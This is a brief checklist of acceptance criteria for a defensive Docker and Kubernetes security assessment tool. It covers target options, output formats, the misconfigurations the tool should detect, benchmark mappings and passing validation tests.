- [ ] CKSAT runs with `--target docker`, `--target kubernetes`, `--target all`
- [ ] JSON, Markdown, and text output formats generate correctly
- [ ] Docker assessor identifies socket exposure, privileged containers, dangerous caps, host namespaces
- [ ] Kubernetes assessor identifies anonymous access, overprivileged RBAC, missing NetworkPolicy
- [ ] Findings include severity, CIS benchmark reference, and MITRE ATT&CK mapping
- [ ] Test script passes all 5 validation tests
